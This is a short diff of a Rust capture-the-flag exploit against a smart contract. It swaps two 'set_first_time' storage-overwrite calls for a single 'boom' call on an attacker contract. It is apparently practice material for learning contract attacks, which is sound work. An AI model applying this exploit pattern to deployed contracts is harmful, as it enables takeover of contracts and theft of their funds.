@@ -21,17 +21,10 @@ impl ctf::Exploit for Exploit {
         )?
         .send()
         .await?;
-        let address_hack_uint256 = hack_contract
-            .address_to_uint_256(hack_contract.address())
-            .call()
+        hack_contract
+            .boom(contract.address(), offender.address())
+            .send()
             .await?;
-        let address_uint256 = hack_contract
-            .address_to_uint_256(offender.address())
-            .call()
-            .await?;
-
-        contract.set_first_time(address_hack_uint256).send().await?;
-        contract.set_first_time(address_uint256).send().await?;
         Ok(())
     }
 }
